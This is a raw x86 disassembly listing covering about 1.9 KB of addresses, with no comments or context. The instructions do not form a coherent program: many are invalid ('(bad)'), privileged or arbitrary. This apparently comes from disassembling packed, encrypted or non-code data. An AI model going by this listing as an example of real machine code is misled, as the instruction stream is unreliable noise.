  4149e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4149e1:	mov    ch,0x77
  4149e3:	das    
  4149e4:	stc    
  4149e5:	mov    ds:0xe4ee7aab,al
  4149ea:	push   cs
  4149eb:	and    al,0x1c
  4149ed:	lods   eax,DWORD PTR ds:[esi]
  4149ee:	add    BYTE PTR [edi+0x0],0x0
  4149f2:	push   edx
  4149f3:	rcr    DWORD PTR ds:0x4eda1750,cl
  4149f9:	cmp    DWORD PTR ds:0x2300b3d4,ebx
  4149ff:	add    BYTE PTR [eax],al
  414a01:	fisubr DWORD PTR [ebx]
  414a03:	sbb    DWORD PTR [eax-0x21ca7c62],ebp
  414a09:	add    ebp,DWORD PTR [ebx]
  414a0b:	pop    eax
  414a0c:	xor    DWORD PTR [eax],edi
  414a0e:	std    
  414a0f:	jae    0x414a28
  414a11:	add    eax,0xc18f6b82
  414a16:	xchg   edx,eax
  414a17:	add    DWORD PTR [edi],esi
  414a19:	xor    BYTE PTR [edi],ch
  414a1b:	xor    BYTE PTR [eax-0x69],ch
  414a1e:	inc    eax
  414a1f:	stc    
  414a20:	add    BYTE PTR [eax],al
  414a22:	dec    edx
  414a23:	push   esp
  414a24:	dec    BYTE PTR [esi+0x4d39e8fe]
  414a2a:	or     BYTE PTR [edx+0x7410000],ah
  414a30:	call   DWORD PTR [ebp+0x47]
  414a33:	cmp    eax,esp
  414a35:	clc    
  414a36:	cmp    eax,0x99795766
  414a3b:	ror    DWORD PTR [esi-0x22],cl
  414a3e:	repz out dx,eax
  414a40:	js     0x4149e3
  414a42:	mov    ecx,0xcb8606a6
  414a47:	ins    BYTE PTR es:[edi],dx
  414a48:	pop    esp
  414a49:	out    dx,eax
  414a4a:	sar    dl,cl
  414a4c:	xor    al,0x11
  414a4e:	cli    
  414a4f:	repz fsubrp st(5),st
  414a52:	imul   ebx,DWORD PTR [esi],0x5f2ebeed
  414a58:	jne    0x4149e0
  414a5a:	clc    
  414a5b:	loopne 0x414a49
  414a5d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414a5e:	div    BYTE PTR [eax+0x56]
  414a61:	aas    
  414a62:	xchg   esi,eax
  414a63:	mov    ds:0xbb865a3,al
  414a68:	lea    ebp,[esi-0xeea7485]
  414a6e:	sub    BYTE PTR ds:0x9e2a9d68,ch
  414a74:	dec    ebp
  414a75:	sti    
  414a76:	inc    ebx
  414a77:	ror    edx,0x18
  414a7a:	push   ebx
  414a7b:	xchg   ebp,eax
  414a7c:	xlat   BYTE PTR ds:[ebx]
  414a7d:	pushf  
  414a7e:	in     al,0x56
  414a80:	mov    esi,0xd3c4
  414a85:	xchg   DWORD PTR [edi+0x28],esi
  414a88:	sbb    DWORD PTR [esi-0x9ea226b],esi
  414a8e:	jb     0x414a76
  414a90:	aad    0xe7
  414a92:	and    esi,0x8bc053
  414a98:	add    dl,dh
  414a9a:	pop    ss
  414a9b:	lock add DWORD PTR [ebx],edx
  414a9e:	sbb    eax,0xc53ac2e6
  414aa3:	aam    0x9a
  414aa5:	jns    0x414b0c
  414aa7:	fmul   st,st(5)
  414aa9:	pop    esp
  414aaa:	dec    esi
  414aab:	loopne 0x414a88
  414aad:	jg     0x414a3f
  414aaf:	lea    ecx,[ecx+0x3d]
  414ab2:	xchg   ebp,eax
  414ab3:	sub    al,0x99
  414ab5:	shr    DWORD PTR [esi+0x1bf4706f],1
  414abb:	pop    ecx
  414abc:	in     eax,dx
  414abd:	neg    dh
  414abf:	mov    edx,0x1ed48750
  414ac4:	jns    0x414a75
  414ac6:	fidivr WORD PTR [edi]
  414ac8:	cmp    edi,ebx
  414aca:	es daa 
  414acc:	lods   eax,DWORD PTR ds:[esi]
  414acd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414ace:	xchg   ecx,eax
  414acf:	push   edx
  414ad0:	xor    BYTE PTR [eax-0x15c521af],dl
  414ad6:	(bad)  
  414ad7:	push   esp
  414ad8:	xor    BYTE PTR [ecx],ah
  414ada:	int3   
  414adb:	xlat   BYTE PTR ds:[ebx]
  414adc:	add    BYTE PTR [eax],al
  414ade:	adc    eax,0xf871bb51
  414ae3:	push   ds
  414ae4:	xchg   DWORD PTR [eax-0x4e],esp
  414ae7:	ficom  WORD PTR [esi+ebx*4+0x9d00]
  414aee:	push   ebx
  414aef:	cmc    
  414af0:	or     bl,BYTE PTR [ebp+0x58]
  414af3:	mov    al,BYTE PTR [ecx+0x7fd57596]
  414af9:	into   
  414afa:	outs   dx,DWORD PTR ds:[esi]
  414afb:	sub    BYTE PTR [ebp+ebp*2-0x6d],dl
  414aff:	inc    esi
  414b00:	mov    esp,0x7599edde
  414b05:	ror    eax,1
  414b07:	aad    0x0
  414b09:	add    BYTE PTR [ebp-0x53],al
  414b0c:	push   es
  414b0d:	pop    esp
  414b0e:	and    cl,BYTE PTR [edi+0x33]
  414b11:	mov    eax,0x1f00358
  414b16:	sti    
  414b17:	js     0x414ac4
  414b19:	add    eax,0xe60ef06c
  414b1e:	push   cs
  414b1f:	jne    0x414b3a
  414b21:	jae    0x414b04
  414b23:	sbb    al,bl
  414b25:	and    eax,0x8efe47b1
  414b2a:	mov    bh,0x20
  414b2c:	add    BYTE PTR [edi+0x0],ah
  414b2f:	add    BYTE PTR [esi-0x5b],cl
  414b32:	jmp    0xb36c:0x6d0c
  414b39:	sbb    eax,0x6aaa85bd
  414b3e:	mov    al,ds:0xd7fde636
  414b43:	jl     0x414b5e
  414b45:	mov    esp,0x1aa6af82
  414b4a:	jecxz  0x414b01
  414b4c:	ffreep st(6)
  414b4e:	out    0x32,al
  414b50:	cmc    
  414b51:	mov    ah,dl
  414b53:	add    BYTE PTR [eax],al
  414b55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414b56:	dec    eax
  414b57:	inc    ebp
  414b58:	add    BYTE PTR [eax],al
  414b5a:	add    ah,BYTE PTR [edx-0x34]
  414b5d:	mov    ebp,0x96c00000
  414b62:	add    BYTE PTR [eax],al
  414b64:	xor    eax,0xe70c
  414b69:	cmp    ebp,DWORD PTR [ebx-0x29]
  414b6c:	ja     0x414b43
  414b6e:	jge    0x414b4e
  414b70:	xchg   ecx,eax
  414b71:	mov    cl,0xe8
  414b73:	in     eax,dx
  414b74:	mov    esi,0x593e618d
  414b79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b7a:	and    BYTE PTR [eax+0x46],bl
  414b7d:	aad    0x81
  414b7f:	imul   esi,esp,0x34
  414b82:	shld   DWORD PTR [esi-0x46],esp,cl
  414b86:	sar    BYTE PTR [edi],1
  414b88:	push   ss
  414b89:	aam    0x24
  414b8b:	ins    BYTE PTR es:[edi],dx
  414b8c:	mov    BYTE PTR [edx+0x0],bl
  414b8f:	add    bl,bh
  414b91:	fld    QWORD PTR [edi]
  414b93:	and    ch,dh
  414b95:	scas   eax,DWORD PTR es:[edi]
  414b96:	pop    esi
  414b97:	or     al,0x39
  414b99:	add    BYTE PTR [eax],al
  414b9b:	mov    ds:0x9a767acb,al
  414ba0:	add    dl,al
  414ba2:	add    BYTE PTR [eax],al
  414ba4:	mov    bh,0x6b
  414ba6:	aad    0x28
  414ba8:	and    al,BYTE PTR [ebx]
  414baa:	repnz shl bh,cl
  414bad:	jge    0x414b6c
  414baf:	les    ecx,FWORD PTR [edx]
  414bb1:	add    BYTE PTR [eax],al
  414bb3:	ret    0xb220
  414bb6:	nop
  414bb7:	ret    
  414bb8:	mov    ch,0x43
  414bba:	jecxz  0x414c36
  414bbc:	ins    DWORD PTR es:[edi],dx
  414bbd:	out    dx,al
  414bbe:	aas    
  414bbf:	xlat   BYTE PTR ds:[ebx]
  414bc0:	iret   
  414bc1:	jbe    0x414bcb
  414bc3:	rol    DWORD PTR [eax],0x0
  414bc6:	jle    0x414bd3
  414bc8:	xor    esi,0x4c6a3575
  414bce:	fadd   DWORD PTR [eax]
  414bd0:	add    BYTE PTR [ecx],al
  414bd2:	aas    
  414bd3:	add    ah,cl
  414bd5:	add    BYTE PTR [eax],al
  414bd7:	add    dh,cl
  414bd9:	add    BYTE PTR [eax],al
  414bdb:	or     ah,ah
  414bdd:	push   edi
  414bde:	fs push esp
  414be0:	repz ret 0xd0de
  414be4:	stc    
  414be5:	push   ds
  414be6:	not    BYTE PTR [ebx+0x1cc0]
  414bec:	into   
  414bed:	mov    ss,WORD PTR [edx-0x61]
  414bf0:	xor    eax,0xef6cc733
  414bf5:	dec    esi
  414bf6:	fistp  DWORD PTR ds:0xa54b7dea
  414bfc:	imul   esi,DWORD PTR ds:0x492ab5c3,0xfffffffc
  414c03:	lahf   
  414c04:	mov    DWORD PTR [edx*8-0x3fda0000],0x4100001b
  414c0f:	lds    ecx,FWORD PTR [esi+0x20]
  414c12:	lds    ebx,FWORD PTR [ecx+0x38]
  414c15:	ins    BYTE PTR es:[edi],dx
  414c16:	adc    dl,BYTE PTR [edx+0x37]
  414c19:	inc    edx
  414c1a:	pop    ds
  414c1b:	add    BYTE PTR [ecx],dh
  414c1d:	add    BYTE PTR [eax],al
  414c1f:	clc    
  414c20:	cmp    bh,dh
  414c22:	jmp    0x32b74f3b
  414c27:	daa    
  414c28:	cli    
  414c29:	sub    eax,DWORD PTR [esi]
  414c2b:	cdq    
  414c2c:	cmp    DWORD PTR [eax],edx
  414c2e:	sbb    al,BYTE PTR [esi]
  414c30:	jne    0x414c5c
  414c32:	adc    BYTE PTR [eax],dl
  414c34:	ret    0x5566
  414c37:	cs shl ebp,0xf9
  414c3b:	pop    ds
  414c3c:	loop   0x414c3c
  414c3e:	fstp   QWORD PTR [edi]
  414c40:	push   ebx
  414c41:	jmp    0x414c04
  414c43:	jnp    0x414c8f
  414c45:	fbld   TBYTE PTR [ebx]
  414c47:	mov    esi,0x1eff595c
  414c4c:	or     DWORD PTR [esi+0x54],edi
  414c4f:	sbb    eax,0xbd0cda13
  414c54:	add    BYTE PTR [eax],al
  414c56:	addr16 inc edx
  414c58:	lods   al,BYTE PTR ds:[esi]
  414c59:	cmp    al,BYTE PTR [esi+0x32fc435a]
  414c5f:	lods   eax,DWORD PTR ds:[esi]
  414c60:	cmp    DWORD PTR [ecx+0x33],edi
  414c63:	out    dx,al
  414c64:	fisub  DWORD PTR [eax+eiz*8+0x4c2edb06]
  414c6b:	aam    0x0
  414c6d:	add    BYTE PTR [edx-0x4bb1afd],dl
  414c73:	add    BYTE PTR [eax],al
  414c75:	and    bh,al
  414c77:	cmp    edx,eax
  414c79:	arpl   WORD PTR [edi+eax*8],bp
  414c7c:	jnp    0x414c41
  414c7e:	adc    DWORD PTR [edx],0xd2dc41e5
  414c84:	push   ebx
  414c85:	cmc    
  414c86:	cdq    
  414c87:	call   0x42360c
  414c8c:	scas   al,BYTE PTR es:[edi]
  414c8d:	and    BYTE PTR [ebx-0x2e0c0000],0x3d
  414c94:	fucomp st(2)
  414c96:	mov    edx,0x8c27c64d
  414c9b:	dec    ebp
  414c9c:	add    BYTE PTR [eax],al
  414c9e:	add    DWORD PTR ds:0x1117a0cf,eax
  414ca4:	retf   
  414ca5:	push   esi
  414ca6:	add    eax,0xf5ad09d0
  414cab:	or     DWORD PTR [ebp-0x794ea258],ebx
  414cb1:	mov    BYTE PTR [eax+eax*1],bh
  414cb4:	add    dh,bl
  414cb6:	mov    ds:0xc7b1f326,al
  414cbb:	aas    
  414cbc:	pop    ebp
  414cbd:	vpmulhuw ymm7,ymm6,YMMWORD PTR [ecx+0x7]
  414cc2:	sbb    DWORD PTR [ebx],edx
  414cc4:	test   DWORD PTR [eax-0x7cffff14],0x31d97fcd
  414cce:	mov    dl,0x91
  414cd0:	sbb    eax,0x3fe42cee
  414cd5:	pop    esp
  414cd6:	adc    bl,dl
  414cd8:	inc    esp
  414cd9:	mov    ch,0x0
  414cdb:	add    BYTE PTR [edi+0x65],cl
  414cde:	pop    ebx
  414cdf:	ret    
  414ce0:	sbb    esi,DWORD PTR [esp+ebx*4+0x0]
  414ce4:	cmp    al,BYTE PTR [eax]
  414ce6:	add    bh,al
  414ce8:	das    
  414ce9:	mov    ds:0xc48,eax
  414cee:	or     eax,0xb61f598e
  414cf3:	push   ebp
  414cf4:	add    esi,DWORD PTR [ecx+esi*8-0x62]
  414cf8:	(bad)  
  414cf9:	sbb    ebp,edx
  414cfb:	mov    ds:0x4284d4,eax
  414d00:	add    BYTE PTR [eax+0x3d],al
  414d03:	add    BYTE PTR [eax],al
  414d05:	mov    ds:0x3561a6d3,eax
  414d0a:	pop    ds
  414d0b:	and    eax,0x848671d4
  414d10:	add    eax,DWORD PTR [eax]
  414d12:	add    dh,dh
  414d14:	(bad)  
  414d15:	sub    BYTE PTR [ecx],cl
  414d17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414d18:	enter  0x11,0x0
  414d1c:	lods   al,BYTE PTR ds:[esi]
  414d1d:	ins    DWORD PTR es:[edi],dx
  414d1e:	in     eax,dx
  414d1f:	cli    
  414d20:	xor    al,0x39
  414d22:	add    DWORD PTR [esi-0x3eeec333],0xffffff93
  414d29:	pop    eax
  414d2a:	test   DWORD PTR [esi],esi
  414d2c:	fwait
  414d2d:	icebp  
  414d2e:	and    al,0x48
  414d30:	sldt   WORD PTR [eax]
  414d33:	xor    DWORD PTR [ebx-0x58fb685c],ebp
  414d39:	add    BYTE PTR [eax],al
  414d3b:	sbb    ebp,DWORD PTR [edi-0x2d]
  414d3e:	das    
  414d3f:	xor    esi,eax
  414d41:	sub    BYTE PTR [ecx-0x10760000],0xb4
  414d48:	or     dl,cl
  414d4a:	add    BYTE PTR [eax],al
  414d4c:	jne    0x414d67
  414d4e:	out    dx,eax
  414d4f:	jb     0x414d84
  414d51:	rcl    DWORD PTR [esi+0x57],1
  414d54:	jae    0x414cd6
  414d56:	fiadd  DWORD PTR [eax]
  414d58:	add    BYTE PTR [ebx+eax*8+0x7a04],bl
  414d5f:	(bad)  
  414d60:	jg     0x414d6d
  414d62:	jmp    0xccbd:0x30399085
  414d69:	xor    DWORD PTR [eax],eax
  414d6b:	add    BYTE PTR [ebx+0x585fbe6c],cl
  414d71:	xchg   ebp,eax
  414d72:	dec    esp
  414d73:	daa    
  414d74:	add    BYTE PTR [eax],al
  414d76:	aad    0xb6
  414d78:	jle    0x414dcd
  414d7a:	loope  0x414d64
  414d7c:	mov    BYTE PTR [ebx],ah
  414d7e:	add    BYTE PTR [eax],al
  414d80:	cwde   
  414d81:	adc    esi,edx
  414d83:	jge    0x414dea
  414d85:	data16 inc si
  414d88:	mov    dl,0x6b
  414d8a:	fistp  DWORD PTR [ebx-0x53]
  414d8d:	in     eax,dx
  414d8e:	cmp    ch,BYTE PTR [eax-0x73]
  414d91:	mov    ebx,0x187fe6fc
  414d96:	cmp    eax,0x6f0e1e58
  414d9b:	cmp    ch,BYTE PTR [ebx+0x650e2dcd]
  414da1:	call   0x1e2e8189
  414da6:	jb     0x414dd9
  414da8:	ins    DWORD PTR es:[edi],dx
  414da9:	jno    0x414db2
  414dab:	rep stos BYTE PTR es:[edi],al
  414dad:	popf   
  414dae:	sti    
  414daf:	shr    DWORD PTR [esi+0x6573320],0xd7
  414db6:	and    DWORD PTR [esi+0x95c073],0x0
  414dbd:	mov    ah,0xff
  414dbf:	mov    ebx,0x5388dd12
  414dc4:	add    BYTE PTR [eax],al
  414dc6:	adc    ebx,DWORD PTR [ebx+0x4f]
  414dc9:	fdiv   DWORD PTR [esi]
  414dcb:	inc    eax
  414dcc:	data16 add BYTE PTR [eax],al
  414dcf:	int3   
  414dd0:	and    eax,0x4e630000
  414dd5:	inc    esi
  414dd6:	cmp    dl,ah
  414dd8:	and    BYTE PTR [edx+ebp*8-0x6],ch
  414ddc:	jb     0x414dad
  414dde:	int    0x13
  414de0:	jo     0x414dcf
  414de2:	pop    ss
  414de3:	out    dx,eax
  414de4:	jns    0x414e3c
  414de6:	out    0xc3,al
  414de8:	bound  edi,QWORD PTR ds:0x3d0fbafb
  414dee:	xchg   esp,eax
  414def:	add    ebp,edx
  414df1:	push   cs
  414df2:	add    dx,WORD PTR [eax+0x4ae3b1b]
  414df9:	scas   al,BYTE PTR es:[edi]
  414dfa:	add    BYTE PTR [eax],al
  414dfc:	push   0xc983f35d
  414e01:	out    dx,eax
  414e02:	popa   
  414e03:	aas    
  414e04:	test   al,0xa
  414e06:	(bad)  
  414e08:	in     al,dx
  414e09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e0a:	pop    esi
  414e0b:	lods   eax,DWORD PTR ds:[esi]
  414e0c:	and    al,dl
  414e0e:	xor    DWORD PTR [ebx+0x6344bb],ebp
  414e14:	add    BYTE PTR [edx+0x4b68faf],dh
  414e1a:	xor    BYTE PTR [eax],al
  414e1c:	add    BYTE PTR [edi+eiz*8+0x0],al
  414e20:	add    BYTE PTR [ecx],dh
  414e22:	jbe    0x414e8c
  414e24:	push   ecx
  414e25:	retf   0x8307
  414e28:	cli    
  414e29:	inc    edx
  414e2a:	loope  0x414e99
  414e2c:	push   ss
  414e2d:	(bad)  
  414e2e:	aam    0xf2
  414e30:	shr    eax,1
  414e32:	push   0xffffffff
  414e34:	cmp    al,dh
  414e36:	(bad)  
  414e37:	cmp    ch,bl
  414e39:	pop    ebx
  414e3a:	aas    
  414e3b:	mov    esi,0x1bcbaee4
  414e40:	add    dl,BYTE PTR [eax+0x59]
  414e43:	add    eax,0x881a20e1
  414e48:	or     BYTE PTR [eax],al
  414e4a:	add    BYTE PTR [esi],dh
  414e4c:	retf   0x59e3
  414e4f:	ins    BYTE PTR es:[edi],dx
  414e50:	dec    ecx
  414e51:	xchg   ebx,eax
  414e52:	arpl   WORD PTR [ebp-0x5841d56e],si
  414e58:	or     eax,0xc9694681
  414e5d:	(bad)  
  414e5e:	(bad)  
  414e5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414e60:	and    eax,0x287c1cfe
  414e65:	push   eax
  414e66:	out    dx,al
  414e67:	popf   
  414e68:	jnp    0x414ee3
  414e6a:	cmp    dl,BYTE PTR [ebp+0x64]
  414e6d:	test   ebp,esp
  414e6f:	icebp  
  414e70:	push   ecx
  414e71:	jmp    0xb537:0x45a522f9
  414e78:	or     BYTE PTR [edi+0x0],bh
  414e7b:	add    BYTE PTR [eax+0x4b],dl
  414e7e:	cmc    
  414e7f:	or     edi,DWORD PTR [edi]
  414e81:	mov    ch,0x36
  414e83:	stos   BYTE PTR es:[edi],al
  414e84:	push   edi
  414e85:	mov    cl,0xdb
  414e87:	and    DWORD PTR [esi],0x7e
  414e8a:	or     DWORD PTR [edx],ebx
  414e8c:	sbb    al,0x5f
  414e8e:	sub    BYTE PTR [ebx+0x6164d07b],bl
  414e94:	xor    BYTE PTR [edi-0xc7b78c5],dl
  414e9a:	add    BYTE PTR [eax],al
  414e9c:	in     eax,dx
  414e9d:	(bad)  
  414e9f:	jp     0x414e90
  414ea1:	pop    esi
  414ea2:	pop    es
  414ea3:	xchg   esp,eax
  414ea4:	dec    ebp
  414ea5:	ins    BYTE PTR es:[edi],dx
  414ea6:	add    ecx,esp
  414ea8:	jo     0x414e74
  414eaa:	and    dh,BYTE PTR [edi-0x2f]
  414ead:	in     al,dx
  414eae:	or     al,0x88
  414eb0:	add    BYTE PTR [eax],al
  414eb2:	dec    ebx
  414eb3:	xchg   esi,eax
  414eb4:	in     al,0xa2
  414eb6:	ja     0x414f04
  414eb8:	je     0x414eba
  414eba:	add    BYTE PTR [ecx+eiz*1],bl
  414ebd:	(bad)  
  414ebe:	xor    eax,0xe370ca85
  414ec3:	or     cl,bh
  414ec5:	add    BYTE PTR [eax],al
  414ec7:	mov    ch,0x15
  414ec9:	bound  esp,QWORD PTR [ebx+0x81c4e4]
  414ecf:	add    bh,al
  414ed1:	jmp    0x414ea1
  414ed3:	cmp    eax,0xcb8c2566
  414ed8:	add    BYTE PTR [eax],al
  414eda:	dec    ecx
  414edb:	(bad)  
  414edc:	stc    
  414edd:	repz pusha 
  414edf:	popa   
  414ee0:	and    al,dl
  414ee2:	jl     0x414eac
  414ee4:	mov    al,BYTE PTR [eax]
  414ee6:	add    ah,bh
  414ee8:	pop    edi
  414ee9:	add    edi,eax
  414eeb:	or     esp,DWORD PTR [esi+0x26]
  414eee:	shl    ebx,0xc8
  414ef1:	push   es
  414ef2:	add    BYTE PTR [eax],al
  414ef4:	pusha  
  414ef5:	push   edx
  414ef6:	daa    
  414ef7:	pop    ebp
  414ef8:	mov    ebp,0xe944
  414efd:	cmp    al,0x42
  414eff:	fst    DWORD PTR [edx+edi*2+0x40]
  414f03:	loopne 0x414f05
  414f05:	add    bh,dh
  414f07:	xchg   ecx,eax
  414f08:	dec    edx
  414f09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414f0a:	scas   al,BYTE PTR es:[edi]
  414f0b:	imul   edx,DWORD PTR [eax+0x6e]
  414f0f:	jno    0x414f14
  414f11:	push   ebp
  414f12:	push   ds
  414f13:	pushf  
  414f14:	xchg   ebp,eax
  414f15:	stc    
  414f16:	mov    WORD PTR [edi],fs
  414f18:	add    BYTE PTR [eax],al
  414f1a:	in     eax,0xb
  414f1c:	jns    0x414f89
  414f1e:	inc    ecx
  414f1f:	jmp    0xc0132175
  414f24:	mov    dl,0x99
  414f26:	in     eax,dx
  414f27:	outs   dx,BYTE PTR ds:[esi]
  414f28:	sbb    al,0x33
  414f2a:	add    DWORD PTR [ecx-0x7a985de2],ecx
  414f30:	sbb    BYTE PTR [ebx],cl
  414f32:	and    BYTE PTR [eax-0x6a],dh
  414f35:	xchg   DWORD PTR [edx-0x31bc9550],ebp
  414f3b:	add    al,0xa8
  414f3d:	add    BYTE PTR [eax],al
  414f3f:	les    edx,FWORD PTR [ebp+0x75880000]
  414f45:	add    BYTE PTR [eax],al
  414f47:	aam    0x3b
  414f49:	cs pop ebp
  414f4b:	mov    ecx,0x681a6c8a
  414f50:	mov    al,ds:0x915855fd
  414f55:	xchg   esp,eax
  414f56:	sbb    dh,BYTE PTR [edx-0x1cfcf25f]
  414f5c:	ficomp WORD PTR [edx+0x65]
  414f5f:	iret   
  414f60:	lahf   
  414f61:	mov    cl,0xe5
  414f63:	jmp    0xd7f0:0x2908
  414f6a:	sub    DWORD PTR [ebp-0x72ea11d0],ebp
  414f70:	ss mov bh,0xc6
  414f73:	cdq    
  414f74:	dec    ebx
  414f75:	adc    DWORD PTR [edx+0x12],ebp
  414f78:	mov    ebp,DWORD PTR [ecx+0x383fab2e]
  414f7e:	push   0xffffffc8
  414f80:	fadd   DWORD PTR [eax]
  414f82:	add    BYTE PTR ds:0xfc3f6372,bh
  414f88:	push   eax
  414f89:	inc    BYTE PTR [eax+0x6f0000a5]
  414f8f:	lods   al,BYTE PTR ds:[esi]
  414f90:	inc    eax
  414f91:	cld    
  414f92:	add    BYTE PTR [eax],al
  414f94:	adc    eax,0x42799cab
  414f99:	jae    0x414f8e
  414f9b:	jecxz  0x414f4c
  414f9d:	pop    ebx
  414f9e:	cmc    
  414f9f:	inc    eax
  414fa0:	imul   eax,DWORD PTR [eax],0xfa4f7700
  414fa6:	xor    BYTE PTR [eax+ebx*2],bl
  414fa9:	(bad)  
  414faa:	rcr    BYTE PTR [edi],cl
  414fac:	ret    
  414fad:	xor    BYTE PTR [edi+0x69],bh
  414fb0:	ret    
  414fb1:	ret    0x4549
  414fb4:	push   esp
  414fb5:	and    bl,BYTE PTR ds:0x29a96824
  414fbb:	imul   eax,DWORD PTR [edi-0x58],0xfe8591a7
  414fc2:	pop    ecx
  414fc3:	ret    
  414fc4:	xchg   ebx,eax
  414fc5:	aaa    
  414fc6:	push   ebp
  414fc7:	call   0xab2fa6d3
  414fcc:	cmp    BYTE PTR [esi+0x5121e37c],cl
  414fd2:	xor    al,0xaf
  414fd4:	std    
  414fd5:	jnp    0x415027
  414fd7:	mov    ebx,DWORD PTR [ecx]
  414fd9:	aaa    
  414fda:	sbb    ebp,DWORD PTR [edi+0x18]
  414fdd:	test   eax,0xc6aea78
  414fe2:	test   DWORD PTR [eax],0xbf961300
  414fe8:	sbb    bh,BYTE PTR [edi+0x35]
  414feb:	sbb    bh,ah
  414fed:	ja     0x414f9b
  414fef:	xchg   ebp,eax
  414ff0:	jne    0x41501e
  414ff2:	stc    
  414ff3:	jg     0x414f84
  414ff5:	mov    WORD PTR [edx-0x50930000],cs
  414ffb:	pop    ebx
  414ffc:	pop    ebp
  414ffd:	stos   DWORD PTR es:[edi],eax
  414ffe:	mov    ds:0x1d3c3745,eax
  415003:	shr    DWORD PTR [ebx+0x64],0xf0
  415007:	add    dl,BYTE PTR [edi]
  415009:	nop
  41500a:	cmp    BYTE PTR [esi],0x0
  41500d:	add    BYTE PTR [edx-0x5eb88353],bl
  415013:	mov    dh,0xf1
  415015:	call   0x225c:0x768fca5d
  41501c:	and    dl,BYTE PTR [eax+0xf948]
  415022:	push   esp
  415023:	ja     0x415026
  415025:	cld    
  415026:	or     DWORD PTR [ecx+0x68],edx
  415029:	fidiv  WORD PTR [esi]
  41502b:	xchg   ebp,eax
  41502c:	push   esi
  41502d:	or     BYTE PTR [edi+0x0],dh
  415030:	add    bl,al
  415032:	ret    
  415033:	mov    dl,0xc2
  415035:	stos   DWORD PTR es:[edi],eax
  415036:	not    BYTE PTR [esi-0x6d005953]
  41503c:	ins    DWORD PTR es:[edi],dx
  41503d:	and    DWORD PTR gs:[ebx-0x34],0xffffffe5
  415042:	add    BYTE PTR [eax],al
  415044:	mov    al,ds:0x8a9d59d9
  415049:	jge    0x41507e
  41504b:	aam    0x8e
  41504d:	adc    DWORD PTR [edx+edi*8+0x37fa6b7d],0x200ceb
  415058:	add    BYTE PTR [edx],ch
  41505a:	or     ebp,DWORD PTR [ebx-0x61b708f3]
  415060:	add    BYTE PTR [eax],al
  415062:	and    al,0xba
  415064:	pop    edx
  415065:	xor    BYTE PTR [edi+0x69],cl
  415068:	aam    0xba
  41506a:	ret    
  41506b:	(bad)
  41506f:	xchg   edi,eax
  415070:	inc    ebx
  415071:	repnz aaa 
  415073:	inc    ecx
  415074:	jb     0x4150b8
  415076:	(bad)  
  415077:	adc    eax,0x552e54f7
  41507c:	outs   dx,BYTE PTR ds:[esi]
  41507d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41507e:	pop    edx
  41507f:	data16 xlat BYTE PTR ds:[ebx]
  415081:	xor    edx,0xfffffffb
  415084:	pop    ecx
  415085:	dec    esi
  415086:	or     eax,0xc50832bf
  41508b:	add    BYTE PTR [eax],al
  41508d:	pop    ds
  41508e:	(bad)  
  415090:	adc    ch,ah
  415092:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415093:	and    BYTE PTR [edx+eiz*2+0x17],bh
  415097:	adc    dh,BYTE PTR [ebx]
  415099:	dec    esi
  41509a:	jmp    0x69f2:0xe9baed7e
  4150a1:	mov    esp,DWORD PTR [esp+edi*4-0x2c8778db]
  4150a8:	imul   ebp,DWORD PTR [edx],0x8d2e665f
  4150ae:	xchg   esp,eax
  4150af:	loopne 0x4150dd
  4150b1:	cmp    BYTE PTR [edx-0x1266c5a5],dl
  4150b7:	aad    0xf1
  4150b9:	cmp    esi,ebx
  4150bb:	lods   eax,DWORD PTR ds:[esi]
  4150bc:	les    esp,FWORD PTR [ecx-0x2b2c0000]
  4150c2:	cmc    
  4150c3:	hlt    
  4150c4:	dec    ebp
  4150c5:	push   esi
  4150c6:	pop    ss
  4150c7:	xlat   BYTE PTR ds:[ebx]
  4150c8:	repz sub al,0xc3
  4150cb:	int    0x8d
  4150cd:	fdivr  DWORD PTR [ecx-0x3e]
  4150d0:	pop    ds
  4150d1:	push   0xb408
  4150d6:	mov    BYTE PTR [eax+0x48050000],dl
  4150dc:	jns    0x4150de
  4150de:	add    ah,ch
  4150e0:	mov    dh,0xef
  4150e2:	push   ds
  4150e3:	xchg   ecx,eax
  4150e4:	rcr    DWORD PTR [esi-0x6e],1
  4150e7:	bound  edx,QWORD PTR [edi-0x80]
  4150ea:	dec    esi
  4150eb:	add    BYTE PTR [eax],al
  4150ed:	cwde   
  4150ee:	ret    0x8356
  4150f1:	pop    eax
  4150f2:	xchg   esi,eax
  4150f3:	jo     0x415121
  4150f5:	cmc    
  4150f6:	add    eax,0x548afdbc
  4150fb:	(bad)  
  4150fc:	hlt    
  4150fd:	test   DWORD PTR [ecx+0x4b63eeeb],ebx
  415103:	fdivr  QWORD PTR [edi]
  415105:	sbb    esp,DWORD PTR [eax+eiz*4-0xa]
  415109:	(bad)  
  41510a:	retf   
  41510b:	add    bl,BYTE PTR [eax-0x7b]
  41510e:	sbb    BYTE PTR [edx],dl
  415110:	push   ebp
  415111:	retf   0xc724
  415114:	(bad)  
  415115:	test   al,0x9e
  415117:	ja     0x41512b
  415119:	or     al,0x82
  41511b:	add    BYTE PTR [eax],al
  41511d:	fst    QWORD PTR ds:0x7e147c92
  415123:	mov    al,0x58
  415125:	fadd   QWORD PTR [edx]
  415127:	sbb    bl,BYTE PTR [ecx-0x51]
  41512a:	gs leave 
  41512c:	icebp  
  41512d:	cmp    ebx,esi
  41512f:	retf   0x2b0a
  415132:	out    0x9e,al
  415134:	rcl    BYTE PTR ds:0x8f631611,cl
  41513a:	fidivr WORD PTR [edi-0x25]
  41513d:	push   0xfe604fd0
  415142:	adc    eax,0x11b06091
  415147:	iret   
  415148:	lods   eax,DWORD PTR ds:[esi]
  415149:	pop    edx
  41514a:	stc    
  41514b:	loopne 0x41518d
  41514d:	jo     0x41514f
  41514f:	add    dh,dh
  415151:	mov    ch,BYTE PTR [edi+0x4231ffbe]
  415157:	ret    
  415158:	int3   
  415159:	rol    BYTE PTR [eax],0x0
  41515c:	jecxz  0x41515c
